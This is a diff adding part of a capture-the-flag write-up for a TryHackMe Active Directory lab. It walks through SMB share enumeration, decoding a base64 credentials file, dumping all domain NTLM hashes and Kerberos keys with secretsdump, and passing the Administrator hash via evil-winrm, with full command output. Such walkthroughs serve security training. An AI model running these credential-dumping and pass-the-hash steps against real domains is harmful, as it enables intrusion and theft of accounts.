@@ -306,3 +306,306 @@ So from the `hashcat` output the password is `management2005` .
 
 
 # Enumeration  – With Credentials
+
+Now that we have credentials, we can try to enumerate shares and use the credentials to get more details back
+
+so we'll run this command with `smbclient` tool :
+
+```bash
+smbclient -L <ip> -U svc-admin
+```
+
+Note : (- L for list of shares )
+
+And we got this output :
+
+```bash 
+[👾]   )#  smbclient -L 10.10.24.200 -U svc-admin                                                                                                                                                        [/root]
+Password for [WORKGROUP\svc-admin]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backup          Disk
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.24.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+```
+
+
+Next I started going down the list with `svc-admin`‘s credentials, we have access to the backup share, which we can access with this command :
+
+```bash
+smbclient \\\\<ip>\\backup -U svc-admin
+```
+
+And we got this :
+
+```bash 
+[👾]   )#  smbclient \\\\10.10.24.200\\backup -U svc-admin                                                                                                                                               [/root]
+Password for [WORKGROUP\svc-admin]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Apr  4 21:08:39 2020
+  ..                                  D        0  Sat Apr  4 21:08:39 2020
+  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020
+
+                8247551 blocks of size 4096. 3636231 blocks available
+smb: \> get backup_credentials.txt
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \> get backup_credentials.txt
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \> ^Z
+[5]  + 228797 suspended  smbclient \\\\10.10.24.200\\backup -U svc-admin
+```
+
+And when open the file we already got it from `smb`  connection we see that :
+
+```bash 
+[👾]   )#  cat backup_credentials.txt                                                                                                                                                                    [/root]
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+```
+
+So lets try to decode with base64 with this command :
+
+```bash
+[👾]   )#  base64 -d backup_credentials.txt 
+```
+
+and we got this  credentials  :
+
+```bash 
+backup@spookysec.local:backup2517860 
+```
+
+# Elevating Privileges
+
+With our new credentials, we could have elevated access. This backup account could be the backup for the entire Domain Controller that would allow all AD changes to be synced to this account, including password hashes. We can use a different `impacket` tool called `secretsdump.py`to retrieve all the password hashes we could have access with this command:
+
+```bash
+secretsdump.py -dc-ip <ip> -target-ip <ip> backup@spookysec.local
+```
+
+And here we go we got this :
+
+```bash 
+
+[👾]   )#  secretsdump.py -just-dc backup@10.10.24.200                                                                                                                                                   [/root]
+/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'secretsdump.py')
+Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
+spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
+spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
+spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
+spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
+spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
+spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:b5b6437f2612905fdacd1dd9f55e2d3a:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
+Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
+Administrator:des-cbc-md5:2079ce0e5df189ad
+krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
+krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
+krbtgt:des-cbc-md5:b94f97e97fabbf5d
+spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
+spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
+spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
+spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
+spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
+spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
+spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
+spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
+spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
+spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
+spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
+spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
+spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
+spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
+spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
+spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
+spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
+spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
+spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
+spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
+spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
+spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
+spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
+spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
+spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
+spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
+spookysec.local\paradox:des-cbc-md5:83988983f8b34019
+spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
+spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
+spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
+spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
+spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
+spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
+spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
+spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
+spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
+spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
+spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
+spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
+spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
+spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
+spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
+ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:190460f347b3b4b9a4530704130a10e1962ca8c17e94a55062c83871a37aabb4
+ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:7968b73916c040e3a84e6e90d8e83c86
+ATTACKTIVEDIREC$:des-cbc-md5:52b94abc70c27f79
+```
+
+Now we'll use  `evil-winrm` tool  with this command :
+
+```bash
+evil-winrm -i <ip> -u Administrator -H <hash>
+```
+
+Note: the hash is NT hash see this example :
+
+```bash
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+```
+
+The NET  hash is `0e0363213e37b94221497260b0bcb4fc` .
+
+And after run command i discover the  Machine to found the flag and this is my process to found them :
+
+#### Administrator Flag
+
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd Desktop
+Cannot find path 'C:\Users\Administrator\Documents\Desktop' because it does not exist.
+At line:1 char:1
++ cd Desktop
++ ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Documents\Desktop:String) [Set-Location], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  11:39 AM             32 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+TryHackMe{Brahh go and try }
+```
+
+
+#### svc-admin flag
+
+```bash
+*Evil-WinRM* PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/17/2020   4:04 PM                a-spooks
+d-----        9/17/2020   4:02 PM                Administrator
+d-----         4/4/2020  12:19 PM                backup
+d-----         4/4/2020   1:07 PM                backup.THM-AD
+d-r---         4/4/2020  11:19 AM                Public
+d-----         4/4/2020  12:18 PM                svc-admin
+
+
+*Evil-WinRM* PS C:\Users> cd svc-admin
+*Evil-WinRM* PS C:\Users\svc-admin> dir
+
+
+    Directory: C:\Users\svc-admin
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         4/4/2020  12:18 PM                3D Objects
+d-r---         4/4/2020  12:18 PM                Contacts
+d-r---         4/4/2020  12:18 PM                Desktop
+d-r---         4/4/2020  12:18 PM                Documents
+d-r---         4/4/2020  12:18 PM                Downloads
+d-r---         4/4/2020  12:18 PM                Favorites
+d-r---         4/4/2020  12:18 PM                Links
+d-r---         4/4/2020  12:18 PM                Music
+d-r---         4/4/2020  12:18 PM                Pictures
+d-r---         4/4/2020  12:18 PM                Saved Games
+d-r---         4/4/2020  12:18 PM                Searches
+d-r---         4/4/2020  12:18 PM                Videos
+
+
+*Evil-WinRM* PS C:\Users\svc-admin> cd Documents
+*Evil-WinRM* PS C:\Users\svc-admin\Documents> dir
+*Evil-WinRM* PS C:\Users\svc-admin\Documents> dir
+*Evil-WinRM* PS C:\Users\svc-admin\Documents> cd ..
+*Evil-WinRM* PS C:\Users\svc-admin> cd Desktop
+*Evil-WinRM* PS C:\Users\svc-admin\Desktop> dir
+
+
+    Directory: C:\Users\svc-admin\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  12:18 PM             28 user.txt.txt
+
+
+*Evil-WinRM* PS C:\Users\svc-admin\Desktop> cat user.txt.txt
+TryHackMe{you stilll !!!!!!!!!}
+```
+
+
+#### backup flag 
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-admin\Desktop> cd ..
+*Evil-WinRM* PS C:\Users\svc-admin> cd ..
+*Evil-WinRM* PS C:\Users> cd backup
+*Evil-WinRM* PS C:\Users\backup> cd Desktop
+*Evil-WinRM* PS C:\Users\backup\Desktop> dir
+
+
+    Directory: C:\Users\backup\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  12:19 PM             26 PrivEsc.txt
+
+
+*Evil-WinRM* PS C:\Users\backup\Desktop> cat PrivEsc.txt
+TryHackMe{nahh hehe }
+```
+
+This machine was a great reminder that every small clue can lead to a bigger breakthrough. By following a structured approach — reconnaissance, exploitation, and privilege escalation — we managed to complete it step by step. Hopefully this write-up helps others facing the same challenge.
+
+
+https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNG5nNm1kdXV6aWJ3eTczdXQwNmxhczVjN3U4ODByeTQzNHY2aGJ5aCZlcD12MV9naWZzX3RyZW5kaW5nJmN0PWc/xYGnFm4mVcMxYIVq3v/giphy.gif
+
